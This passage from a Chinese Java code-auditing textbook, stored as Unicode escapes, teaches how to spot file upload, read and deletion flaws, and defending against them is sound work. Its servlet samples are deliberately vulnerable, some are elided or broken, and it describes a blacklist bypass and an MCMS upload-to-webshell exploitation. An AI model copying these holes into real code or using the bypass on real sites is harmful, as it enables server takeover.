Java\u4EE3\u7801\u7684\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u6D89\u53CA\u5230\u5176\u8F93\u5165/\u8F93\u51FA\u6D41\uFF0CJava\u4E2D\u652F\u6301\u6587\u4EF6\u4E0A\u4F20\u7684\u529F\u80FD\u7C7B\u5305\u62EC\uFF1ARandomAccessFile\u548Ccommons-fileupload\u7EC4\u4EF6\u3002\r
\r
\uFF081\uFF09  RandomAccessFile\u7C7B\u6587\u4EF6\u4E0A\u4F20\u6848\u4F8B\r
\r
RandomAccessFile\u662FJava\u8F93\u5165/\u8F93\u51FA\u6D41\u4F53\u7CFB\u4E2D\u529F\u80FD\u6700\u4E30\u5BCC\u7684\u6587\u4EF6\u5185\u5BB9\u8BBF\u95EE\u7C7B\uFF0C\u5176\u65E2\u53EF\u4EE5\u8BFB\u53D6\u6587\u4EF6\u5185\u5BB9\uFF0C\u4E5F\u53EF\u4EE5\u5411\u6587\u4EF6\u8F93\u51FA\u6570\u636E\u3002\u4E0E\u666E\u901A\u7684\u8F93\u5165/\u8F93\u51FA\u6D41\u4E0D\u540C\uFF0CRandomAccessFile\u652F\u6301\u8DF3\u5230\u6587\u4EF6\u4EFB\u610F\u4F4D\u7F6E\u8BFB\u5199\u6570\u636E\uFF0CRandomAccessFile\u5BF9\u8C61\u5305\u542B\u4E00\u4E2A\u8BB0\u5F55\u6307\u9488\uFF0C\u7528\u4EE5\u6807\u8BC6\u5F53\u524D\u8BFB\u5199\u5904\u7684\u4F4D\u7F6E\uFF0C\u5F53\u7A0B\u5E8F\u521B\u5EFA\u4E00\u4E2A\u65B0\u7684RandomAccessFile\u5BF9\u8C61\u65F6\uFF0C\u8BE5\u5BF9\u8C61\u7684\u6587\u4EF6\u8BB0\u5F55\u6307\u9488\u5BF9\u4E8E\u6587\u4EF6\u5934\uFF08\u4E5F\u5C31\u662F0\u5904\uFF09\uFF0C\u5F53\u8BFB\u5199n\u4E2A\u5B57\u8282\u540E\uFF0C\u6587\u4EF6\u8BB0\u5F55\u6307\u9488\u5C06\u4F1A\u5411\u540E\u79FB\u52A8n\u4E2A\u5B57\u8282\u3002\r
\r
RandomAccessFile\u5305\u542B\u4E24\u4E2A\u65B9\u6CD5\u6765\u64CD\u4F5C\u6587\u4EF6\u8BB0\u5F55\u6307\u9488\uFF1A\r
\r
l long getFilePointer()\uFF1A\u8FD4\u56DE\u6587\u4EF6\u8BB0\u5F55\u6307\u9488\u7684\u5F53\u524D\u4F4D\u7F6E\uFF1B\r
\r
l void seek(long pos)\uFF1A\u5C06\u6587\u4EF6\u8BB0\u5F55\u6307\u9488\u5B9A\u4F4D\u5230pos\u4F4D\u7F6E\u3002\r
\r
RandomAccessFile\u7C7B\u5728\u521B\u5EFA\u5BF9\u8C61\u65F6\uFF0C\u9664\u4E86\u6307\u5B9A\u6587\u4EF6\u672C\u8EAB\uFF0C\u8FD8\u9700\u8981\u6307\u5B9A\u4E00\u4E2Amode\u53C2\u6570\uFF0C\u8BE5\u53C2\u6570\u6307\u5B9ARandomAccessFile\u7684\u8BBF\u95EE\u6A21\u5F0F\uFF0C\u8BE5\u53C2\u6570\u6709\u5982\u4E0B\u56DB\u4E2A\u503C\uFF1A\r
\r
l r\uFF1A\u4EE5\u53EA\u8BFB\u65B9\u5F0F\u6253\u5F00\u6307\u5B9A\u6587\u4EF6\u3002\u5982\u679C\u8BD5\u56FE\u5BF9\u8BE5RandomAccessFile\u6307\u5B9A\u7684\u6587\u4EF6\u6267\u884C\u5199\u5165\u65B9\u6CD5\u5219\u4F1A\u629B\u51FAIOException\uFF1B\r
\r
l rw\uFF1A\u4EE5\u8BFB\u53D6\u3001\u5199\u5165\u65B9\u5F0F\u6253\u5F00\u6307\u5B9A\u6587\u4EF6\u3002\u5982\u679C\u8BE5\u6587\u4EF6\u4E0D\u5B58\u5728\uFF0C\u5219\u5C1D\u8BD5\u521B\u5EFA\u6587\u4EF6\uFF1B\r
\r
l rws\uFF1A\u4EE5\u8BFB\u53D6\u3001\u5199\u5165\u65B9\u5F0F\u6253\u5F00\u6307\u5B9A\u6587\u4EF6\u3002\u76F8\u5BF9\u4E8Erw\u6A21\u5F0F\uFF0C\u8FD8\u8981\u6C42\u5BF9\u6587\u4EF6\u7684\u5185\u5BB9\u6216\u5143\u6570\u636E\u7684\u6BCF\u4E2A\u66F4\u65B0\u90FD\u540C\u6B65\u5199\u5165\u5230\u5E95\u5C42\u5B58\u50A8\u8BBE\u5907\uFF0C\u9ED8\u8BA4\u60C5\u5F62\u4E0B(rw\u6A21\u5F0F\u4E0B)\uFF0C\u662F\u4F7F\u7528buffer\u7684\uFF0C\u53EA\u6709cache\u6EE1\u7684\u6216\u8005\u4F7F\u7528RandomAccessFile.close()\u5173\u95ED\u6D41\u7684\u65F6\u5019\u513F\u624D\u771F\u6B63\u7684\u5199\u5230\u6587\u4EF6\uFF1B\r
\r
l rwd\uFF1A\u4E0Erws\u7C7B\u4F3C\uFF0C\u53EA\u662F\u4EC5\u5BF9\u6587\u4EF6\u7684\u5185\u5BB9\u540C\u6B65\u66F4\u65B0\u5230\u78C1\u76D8\uFF0C\u800C\u4E0D\u4FEE\u6539\u6587\u4EF6\u7684\u5143\u6570\u636E\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u4F7F\u7528RandomAccessFile\u8FDB\u884C\u6587\u4EF6\u4E0A\u4F20\u7684\u6848\u4F8B\u4EE3\u7801\uFF0C\u5176\u4EE3\u7801\u6D41\u7A0B\uFF1A\r
\r
l \u4ECE/upload\u6587\u4EF6\u5939\u4E2D\u8BFB\u53D6\u4E34\u65F6\u6587\u4EF6temp.tmp\u3002\r
\r
l \u4F7F\u7528RandomFile\u5199\u5165\u6587\u4EF6\u3002\r
\r
\u4EE3\u7801\u4E2D\u5E76\u672A\u5199\u5165\u6587\u4EF6\u8FDB\u884C\u7C7B\u578B\u6821\u9A8C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u8BE5\u4EE3\u7801\u529F\u80FD\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
**@WebServlet("/FileUploadServlet")**\r
\r
public class domain extends HttpServlet {\r
\r
\u2026\u7701\u7565\u2026\r
\r
\u200B    **File saveFile = new File(realPath,filename);//****\u5B9A\u4E49\u9700\u8981\u4FDD\u5B58\u7684\u6587\u4EF6**\r
\r
\u200B    **RandomAccessFile randomAccessFile = new RandomAccessFile(saveFile, "rw");**\r
\r
\u200B    **randomFile.seek(randomFile.length());//****\u5B9A\u4F4D\u6587\u4EF6\u957F\u5EA6**\r
\r
\u200B    **long endPosition = randomFile.getFilePointer();//\u83B7\u53D6\u6587\u4EF6\u6307\u9488\u7684\u5F53\u524D\u4F4D\u7F6E**\r
\r
\u200B    int j = 1;\r
\r
\u200B    while((endPosition >= 0) && j <= 2){\r
\r
\u200B      endPosition --;\r
\r
\u200B      randomFile.seek(endPosition);\r
\r
\u200B      if(randomFile.readByte() =='\\n'){\r
\r
\u200B        j++;\r
\r
\u200B      }}\r
\r
\u200B     **randomFile.seek(start);**\r
\r
\u200B     **long startPoint = randomFile.getFilePointer();**\r
\r
\u200B    while(startPoint < endPosition-1){\r
\r
\u200B       **randomAccessFile.write(randomFile.readByte());//****\u5F00\u59CB\u5199\u6587\u4EF6\u5185\u5BB9**\r
\r
\u200B       **startPoint = randomFile.getFilePointer();**}\r
\r
\u200B    randomAccessFile.close();\r
\r
\u200B    randomFile.close();\r
\r
\u200B    tempFile.delete();\r
\r
\u200B    System.out.println("\u6587\u4EF6\u4E0A\u4F20\u6210\u529F");\r
\r
  }\r
\r
}\r
\r
\r
\r
\uFF082\uFF09  commons-fileupload\u7EC4\u4EF6\u6587\u4EF6\u4E0A\u4F20\u6848\u4F8B\r
\r
commons-fileupload\u7EC4\u4EF6\u662F\u7531Apache\u5F00\u53D1\u7684\u4E00\u4E2A\u5E94\u7528\u4E8E\u6587\u4EF6\u4E0A\u4F20\u7EC4\u4EF6\uFF0C\u8BE5\u7EC4\u4EF6\u4E5F\u53EF\u7528\u4E8EJava\u4E2D\u7684\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u4F7F\u7528commons-fileupload\u8FDB\u884C\u6587\u4EF6\u4E0A\u4F20\u7684\u6848\u4F8B\u4EE3\u7801\uFF0C\u4EE3\u7801\u4E2D\u76F4\u63A5\u4ECErequest\u4E2D\u8BFB\u53D6\u6587\u4EF6\uFF0C\u5E76\u5C06\u6587\u4EF6\u5199\u5165\u5230WEB-INF/upload\u76EE\u5F55\u4E0B\uFF0C\u8BE5\u5199\u5165\u6587\u4EF6\u524D\u53EA\u5224\u65AD\u4E86\u6587\u4EF6\u662F\u5426\u4E3A\u7A7A\uFF0C\u5E76\u6CA1\u6709\u5BF9\u6587\u4EF6\u7C7B\u578B\u8FDB\u884C\u5224\u65AD\uFF0C\u56E0\u6B64\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\r
\r
\r
\r
@WebServlet("/FileUploadServlet")\r
\r
public class domain extends HttpServlet{\r
\r
  @Override\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    //\u5F97\u5230\u4E0A\u4F20\u6587\u4EF6\u7684\u4FDD\u5B58\u76EE\u5F55\uFF0C\u5C06\u4E0A\u4F20\u7684\u6587\u4EF6\u5B58\u653E\u4E8EWEB-INF\u76EE\u5F55\u4E0B\uFF0C\u4E0D\u5141\u8BB8\u5916\u754C\u76F4\u63A5\u8BBF\u95EE\uFF0C\u4FDD\u8BC1\u4E0A\u4F20\u6587\u4EF6\u7684\u5B89\u5168\r
\r
\u200B    **String savePath = this.getServletContext().getRealPath("/WEB-INF/upload");**\r
\r
\u200B    File file = new File(savePath);\r
\r
\u200B    if(!file.exists()&&!file.isDirectory()){\r
\r
\u200B      System.out.println("\u76EE\u5F55\u6216\u6587\u4EF6\u4E0D\u5B58\u5728\uFF01");\r
\r
\u200B      file.mkdir();}\r
\r
\u200B    String message = "";\r
\r
\u200B    try {//\u4F7F\u7528Apache\u6587\u4EF6\u4E0A\u4F20\u7EC4\u4EF6\u5904\u7406\u6587\u4EF6\u4E0A\u4F20\u6B65\u9AA4\uFF1A\r
\r
\u200B      //1\u3001\u521B\u5EFA\u4E00\u4E2ADiskFileItemFactory\u5DE5\u5382\r
\r
   DiskFileItemFactory diskFileItemFactory = new DiskFileItemFactory();\r
\r
\u200B      //2\u3001\u521B\u5EFA\u4E00\u4E2A\u6587\u4EF6\u4E0A\u4F20\u89E3\u6790\u5668\r
\r
   ServletFileUpload fileUpload = new ServletFileUpload(diskFileItemFactory);\r
\r
\u200B      //\u89E3\u51B3\u4E0A\u4F20\u6587\u4EF6\u540D\u7684\u4E2D\u6587\u4E71\u7801\r
\r
\u200B      fileUpload.setHeaderEncoding("UTF-8");\r
\r
\u200B      //3\u3001\u5224\u65AD\u63D0\u4EA4\u4E0A\u6765\u7684\u6570\u636E\u662F\u5426\u662F\u4E0A\u4F20\u8868\u5355\u7684\u6570\u636E\r
\r
\u200B      if(!fileUpload.isMultipartContent(request)){return;}\r
\r
\u200B      //4\u3001\u4F7F\u7528ServletFileUpload\u89E3\u6790\u5668\u89E3\u6790\u4E0A\u4F20\u6570\u636E\uFF0C\u89E3\u6790\u7ED3\u679C\u8FD4\u56DE\u7684\u662F\u4E00\u4E2AList<FileItem>\u96C6\u5408\uFF0C\u6BCF\u4E00\u4E2AFileItem\u5BF9\u5E94\u4E00\u4E2AFORM\u8868\u5355\u7684\u8F93\u5165\u9879\r
\r
\u200B      **List<FileItem> list = fileUpload.parseRequest(request);**\r
\r
\u200B      for (FileItem item : list) {\r
\r
\u200B        //\u5982\u679Cfileitem\u4E2D\u5C01\u88C5\u7684\u662F\u666E\u901A\u8F93\u5165\u9879\u7684\u6570\u636E\r
\r
\u200B        if(item.isFORMField()){\r
\r
\u200B          String name = item.getFieldName();\r
\r
\u200B          //\u89E3\u51B3\u666E\u901A\u8F93\u5165\u9879\u7684\u6570\u636E\u7684\u4E2D\u6587\u4E71\u7801\u95EE\u9898\r
\r
\u200B         String value = item.getString("UTF-8");\r
\r
\u200B         String value1 = new String(name.getBytes("iso8859-1"),"UTF-8");\r
\r
\u200B         System.out.println(name+" "+value);\r
\r
\u200B         System.out.println(name+" "+value1);\r
\r
\u200B        }else{\r
\r
\u200B          //\u5982\u679Cfileitem\u4E2D\u5C01\u88C5\u7684\u662F\u4E0A\u4F20\u6587\u4EF6\uFF0C\u5F97\u5230\u4E0A\u4F20\u7684\u6587\u4EF6\u540D\u79F0\uFF0C\r
\r
\u200B          String fileName = item.getName();\r
\r
\u200B          System.out.println(fileName);\r
\r
\u200B           **if(fileName==null||fileName.trim().equals("")){continue;}**\r
\r
\u200B           //\u5904\u7406\u83B7\u53D6\u5230\u7684\u4E0A\u4F20\u6587\u4EF6\u7684\u6587\u4EF6\u540D\u7684\u8DEF\u5F84\u90E8\u5206\uFF0C\u53EA\u4FDD\u7559\u6587\u4EF6\u540D\u90E8\u5206\r
\r
\u200B          **fileName = fileName.substring(fileName.lastIndexOf(File.separator)+1);**\r
\r
\u200B          //\u83B7\u53D6item\u4E2D\u7684\u4E0A\u4F20\u6587\u4EF6\u7684\u8F93\u5165\u6D41\r
\r
\u200B          InputStream is = item.getInputStream();\r
\r
\u200B          //\u521B\u5EFA\u4E00\u4E2A\u6587\u4EF6\u8F93\u51FA\u6D41\r
\r
\u200B       **FileOutputStream fos = new FileOutputStream(savePath+File.separator+fileName);**\r
\r
\u2026\u2026\u7701\u7565\r
\r
\r
\r
\uFF083\uFF09  \u9ED1\u540D\u5355\u8BBE\u7F6E\r
\r
\u5728\u8FDB\u884C\u6587\u4EF6\u4E0A\u4F20\u524D\u5F88\u591A\u5E94\u7528\u7A0B\u5E8F\u4F7F\u7528\u9ED1\u540D\u5355\u6821\u9A8C\u7684\u65B9\u5F0F\u8FDB\u884C\u68C0\u9A8C\uFF0C\u4ECE\u800C\u62B5\u5FA1\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\u4E0B\u9762\u7ED9\u51FA\u9ED1\u540D\u5355\u6821\u9A8C\u673A\u5236\u4EE3\u7801\uFF0C\u5176\u901A\u8FC7\u83B7\u53D6\u4E0A\u4F20\u6587\u4EF6\u7684\u6269\u5C55\u540D\uFF0C\u7136\u540E\u901A\u8FC7equals\u65B9\u6CD5\u5224\u65AD\u6587\u4EF6\u6269\u5C55\u540D\u662F\u5426\u5728\u9ED1\u540D\u5355\u4E2D\u3002\r
\r
\r
\r
//\u5F97\u5230\u4E0A\u4F20\u6587\u4EF6\u7684\u6269\u5C55\u540D\r
\r
String fileExtName = **fileName.substring(fileName.lastIndexOf(".")+1);**       **if("jsp".equals(fileExtName)||"rar".equals(fileExtName)||"tar".equals(fileExtName)||"jar".equals(fileExtName))**{\r
\r
request.setAttribute("message", "\u4E0A\u4F20\u6587\u4EF6\u7684\u7C7B\u578B\u4E0D\u7B26\u5408\uFF01\uFF01\uFF01");\r
\r
request.getRequestDispatcher("/message.jsp").forward(request, response);\r
\r
\u200B            return;\r
\r
\u200B          }\r
\r
\r
\r
\u4F46\u662F\uFF0C\u4E0A\u8FF0Java\u4EE3\u7801\u7684\u9ED1\u540D\u5355\u8FD8\u662F\u80FD\u8FC7\u53BB\u7ED5\u8FC7\u7684\u3002\u5BF9\u4E8EJava\u4EE3\u7801\u5BA1\u8BA1\u800C\u8A00\uFF0C\u5176\u4E3B\u8981\u5BA1\u8BA1\u4E0A\u4F20\u6587\u4EF6\u5904\u662F\u5426\u4F7F\u7528\u9ED1\u540D\u5355\u6821\u9A8C\u673A\u5236\uFF0C\u82E5\u662F\u9ED1\u540D\u5355\u8BE5\u600E\u6837\u8FDB\u884C\u7ED5\u8FC7\u3002\u5982\u679C\u662F\u767D\u540D\u5355\uFF0C\u5728JDK\u4F4E\u7248\u672C\u4E2D\u4E5F\u53EF\u4EE5\u4F7F\u7528%00\u622A\u65AD\u7ED5\u8FC7\u3002\r
\r
\uFF084\uFF09  \u9A8C\u8BC1\u4E0A\u4F20\u6587\u4EF6\u7684MIME\u7C7B\u578B\r
\r
\u5728\u8FDB\u884C\u6587\u4EF6\u4E0A\u4F20\u524D\u5F88\u591A\u5E94\u7528\u7A0B\u5E8F\u8FD8\u53EF\u4EE5\u4F7F\u7528\u901A\u8FC7\u6821\u9A8CMIME\u7C7B\u578B\u7684\u65B9\u6CD5\u8FDB\u884C\u68C0\u9A8C\uFF0C\u4ECE\u800C\u62B5\u5FA1\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\u4E0B\u9762\u7ED9\u51FAMIME\u7C7B\u578B\u6821\u9A8C\u673A\u5236\u4EE3\u7801\uFF0C\u5176\u901A\u8FC7\u83B7\u53D6\u4E0A\u4F20\u6587\u4EF6\u7684MIME\u7C7B\u578B\uFF0C\u7136\u540E\u901A\u8FC7\u8FDB\u884C\u6821\u9A8C\u3002\r
\r
\r
\r
public class mimetype {\r
\r
  public static String main(String fileUrl) throws IOException {\r
\r
\u200B    String type = null;\r
\r
\u200B    URL u = new URL(fileUrl);\r
\r
\u200B    URLConnection uc = u.openConnection();\r
\r
\u200B    **type = uc.getContentType();//\u83B7\u53D6\u6587\u4EF6\u7684MimeType\u7C7B\u578B**\r
\r
\u200B    return type;\r
\r
  }}\r
\r
\r
\r
### 13.5.2 Java\u4E2D\u7684\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\r
\r
Java\u4EE3\u7801\u7684\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u901A\u5E38\u5305\u62EC\uFF1A\u9ED1\u76D2\u6D4B\u8BD5\u548C\u767D\u76D2\u6D4B\u8BD5\u3002\u5BF9\u4E8E\u9ED1\u76D2\u6D4B\u8BD5\u800C\u8A00\uFF0C\u5BA1\u8BA1\u4EBA\u5458\u53EF\u901A\u8FC7\u4FEE\u6539\u6587\u4EF6\u540D\u53C2\u6570\u7684\u5F62\u5F0F\u6D4B\u8BD5\u662F\u5426\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u3002\u5BF9\u4E8E\u767D\u76D2\u6D4B\u8BD5\u800C\u8A00\uFF0C\u4E3B\u8981\u5BA1\u8BA1\u5BF9Java\u4EE3\u7801\u4E2D\u80FD\u5F15\u8D77\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7684\u51FD\u6570\u8FDB\u884C\u5B9A\u4F4D\uFF0C\u901A\u5E38\u6587\u4EF6\u8BFB\u53D6\u529F\u80FD\u7684\u51FD\u6570\u5305\u62EC\uFF1A\u5B57\u8282\u8F93\u5165\u6D41InpputStream\u3001\u5B57\u7B26\u8F93\u5165\u6D41FileReader\uFF0C\u540C\u65F6\u9700\u8981\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u786E\u5B9A\u4F20\u9012\u7684\u53D8\u91CF\u662F\u5426\u53EF\u63A7\u3002\r
\r
\uFF081\uFF09  InputStream\u51FD\u6570\u4EE3\u7801\u6848\u4F8B\r
\r
  \u4E0B\u5217\u4EE3\u7801\u901A\u8FC7\u8BF7\u6C42request\u83B7\u53D6\u6587\u4EF6\u540D\uFF0C\u4F46\u662F\u5E76\u672A\u5BF9\u8BFB\u53D6\u7684\u6587\u4EF6\u540D\u8FDB\u884C\u6821\u9A8C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u540C\u65F6\u4F7F\u7528InputStream\u65B9\u6CD5\u8FDB\u884C\u6587\u4EF6\u7684\u8BFB\u53D6\uFF0C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
@WebServlet("/readServlet")\r
\r
public class readServlet extends HttpServlet {\r
\r
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
   this.doGet(request, response);}\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B     **String filename = request.getParameter("filename");**\r
\r
\u200B    **File file = new File(filename);**\r
\r
\u200B    OutputStream outputStream = null;\r
\r
\u200B    **InputStream inputStream = new FileInputStream(file);**\r
\r
\u200B    int len;\r
\r
\u200B    byte[] bytes = new byte[1024];\r
\r
\u200B    **while(-1 != (len = inputStream.read())) {**\r
\r
\u200B      **outputStream.write(bytes,0,len);**\r
\r
\u200B    **}**\r
\r
}}\r
\r
\r
\r
\uFF082\uFF09  FileReader\u51FD\u6570\u4EE3\u7801\u6848\u4F8B\r
\r
  \u4E0E\u4E0A\u8FF0\u4EE3\u7801\u7C7B\u4F3C\uFF0C\u4E0B\u5217\u4EE3\u7801\u4F7F\u7528FileReader\u51FD\u6570\u8FDB\u884C\u6587\u4EF6\u8BFB\u53D6\uFF0C\u6587\u4EF6\u540D\u79F0\u901A\u8FC7\u8BF7\u6C42request\u83B7\u53D6\u4F46\u672A\u5BF9\u8BFB\u53D6\u7684\u6587\u4EF6\u540D\u8FDB\u884C\u6821\u9A8C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
@WebServlet("/downServlet")\r
\r
public class readServlet extends HttpServlet {\r
\r
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
   this.doGet(request, response);}\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    **String filename = request.getParameter("filename");**\r
\r
\u200B    String fileContent = "";\r
\r
\u200B     **FileReader fileReader = new FileReader(filename);**\r
\r
\u200B    **BufferedReader bufferedReader = new BufferedReader(fileReader);**\r
\r
\u200B    String line = "";\r
\r
\u200B    while (null != (line = bufferedReader.readLine())) {\r
\r
\u200B      fileContent += (line + "\\n");\r
\r
\u200B    }}}\r
\r
\r
\r
### 13.5.3 Java\u4E2D\u7684\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\r
\r
Java\u4EE3\u7801\u7684\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u901A\u5E38\u51FA\u73B0\u5728File\u7C7B\u4E2D\uFF0C\u901A\u8FC7\u8C03\u7528file\u7684delete\u65B9\u6CD5\u53EF\u4EE5\u6839\u636E\u6587\u4EF6\u540D\u5220\u9664\u6587\u4EF6\u3002\u7F51\u7AD9Web\u7A0B\u5E8F\u5728\u5220\u9664\u6587\u4EF6\u7684\u65F6\u5019\uFF0CHTTP\u8BF7\u6C42\u4F20\u9012\u7684\u6587\u4EF6\u540D\u79F0\u53C2\u6570\uFF08filename\uFF09\u672A\u7ECF\u8FC7\u4E25\u683C\u8FC7\u6EE4\uFF0C\u5C06\u6587\u4EF6\u540D\u79F0\u4F20\u9012\u81F3\u540E\u53F0\u7A0B\u5E8F\uFF0C\u5E76\u76F4\u63A5\u5220\u9664\u670D\u52A1\u5668\u4E0B\u67D0\u4E2A\u6587\u4EF6\u3002\r
\r
\u4E0B\u5217\u4EE3\u7801\u901A\u8FC7request\u5BF9\u8C61\u4F20\u9012\u53C2\u6570filename\uFF0C\u5E76\u5220\u9664\u8BE5\u6587\u4EF6\u3002\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
@WebServlet("/downServlet")\r
\r
public class readServlet extends HttpServlet {\r
\r
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
   this.doGet(request, response);}\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    **String filename = request.getParameter("filename");//****\u901A\u8FC7\u8BF7\u6C42\u83B7\u53D6\u6587\u4EF6\u540D**\r
\r
\u200B    **File file = new File(filename);**\r
\r
\u200B    PrintWriter writer = response.getWriter();\r
\r
\u200B    //\u5982\u679C\u6587\u4EF6\u5B58\u5728\u5219\u5220\u9664\u6587\u4EF6\r
\r
\u200B    if(**file != null && file.exists() && file.delete()**) {\r
\r
\u200B      writer.println("\u5220\u9664\u6210\u529F");\r
\r
\u200B    } else {\r
\r
\u200B      writer.println("\u5220\u9664\u5931\u8D25");\r
\r
\u200B    }}}\r
\r
\r
\r
### 13.5.4 MCMS\u5E73\u53F0\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5206\u6790\r
\r
\uFF081\uFF09\u6F0F\u6D1E\u5206\u6790\r
\r
MCMS\u662F\u4E00\u6B3E\u57FA\u4E8EJAVA\u7684\u94ED\u98DE\u5185\u5BB9\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u5728MCMS V4.7.0\u7248\u672C\u4E2D\uFF0C\u7531\u4E8E\u8BE5\u7F51\u7AD9\u662F\u5BF9\u6587\u4EF6\u4E0A\u4F20\u7684\u529F\u80FD\u4F7F\u7528\u524D\u53F0JS\u4EE3\u7801\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4F46\u540E\u53F0\u4EE3\u7801\u7684\u4E0A\u4F20\u529F\u80FD\u672A\u5BF9\u6587\u4EF6\u7C7B\u578B\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\u7684\u6F0F\u6D1E\u3002\r
\r
MCMS\\src\\main\\webapp\\static\\plugins\\ms\\1.0.0\\ms.upload.js\u662F\u6587\u4EF6\u4E0A\u4F20\u7684\u524D\u53F0\u6821\u9A8C\u4EE3\u7801\uFF0C\u5176\u4E3B\u8981\u901A\u8FC7\u6821\u9A8C\u6587\u4EF6\u7684\u989Dmime_type\u7C7B\u578B\u53CA\u540E\u7F00\u540D\u8FDB\u884C\u8FC7\u6EE4\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
// \u5B9A\u4E49\u4E86\u9ED8\u8BA4\u652F\u6301\u4E0A\u4F20\u7684\u6587\u4EF6\u7C7B\u578B\r
 var mimeTypes = {\r
   "image": {\r
     title: "Image files",\r
     extensions: "jpg,JPG,jpeg,PNG,gif,png"\r
   },\r
   "all": {\r
     title: "all files",\r
     extensions: "jpg,JPG,jpeg,PNG,gif,png,ZIP,zip,DOC,doc,docx,xls,XLS,xlsx,RAR,rar"\r
   }\r
\r
\u2026\u7701\u7565\u2026\r
 };\r
\r
\r
\r
\u4E0A\u8FF0\u524D\u53F0\u4EE3\u7801\u63D0\u4F9B\u4E86\u652F\u6301\u7684\u6587\u4EF6\u4E0A\u4F20\u7C7B\u578B\uFF0C\u800C\u524D\u53F0JS\u6821\u9A8C\u53EF\u4F7F\u7528BurpSuite\u6293\u5305\u7684\u65B9\u5F0F\u7ED5\u8FC7\u3002\u56E0\u6B64\uFF0C\u9700\u8981\u5BF9\u8BE5CMS\u540E\u53F0\u4EE3\u7801\u7684\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u8FC7\u6EE4\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u4ECE\u800C\u5206\u6790\u662F\u5426\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
\u901A\u8FC7\u8BE5CMS\u7684\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u540E\u53F0\u4EE3\u7801\u672A\u8FDB\u884C\u6821\u9A8C\uFF0C\u56E0\u6B64\u53EF\u4F7F\u7528BurpSuite\u5DE5\u5177\u4E0A\u4F20\u540D\u4E3A1.jsp\u6587\u4EF6\uFF0C\u8BE5\u6587\u4EF6\u529F\u80FD\u662F\u4F20\u9012\u53C2\u6570i\u5E76\u5C06\u8BE5\u53C2\u6570\u4F5C\u4E3A\u547D\u4EE4\u6267\u884C\uFF0C\u5982\u56FE13-16\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image626.jpg)\r
\r
\u56FE13-16 \u4E0A\u4F20\u7684JSP\u6587\u4EF6\u4EE3\u7801\r
\r
\u4E0A\u4F20\u6210\u529F\u4EE5\u540E\uFF0C\u8BBF\u95EE\u8BE5JSP\u6587\u4EF6\u5E76\u901A\u8FC7\u53C2\u6570i\u4F20\u9012\u547D\u4EE4\u4E3A\u201Cipconfig\u201D\uFF0C\u6267\u884C\u7ED3\u679C\u5982\u56FE13-17\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image628.jpg)\r
\r
\u56FE13-17 \u4EFB\u610F\u6587\u4EF6\u6F0F\u6D1E\u6267\u884C\u6548\u679C\r
\r
## 13.6 Java\u4EE3\u7801\u4E2D\u7684SSRF\u6F0F\u6D1E\r
\r
### 13.6.1 Java\u4E2D\u7684SSRF\u6F0F\u6D1E\r
\r
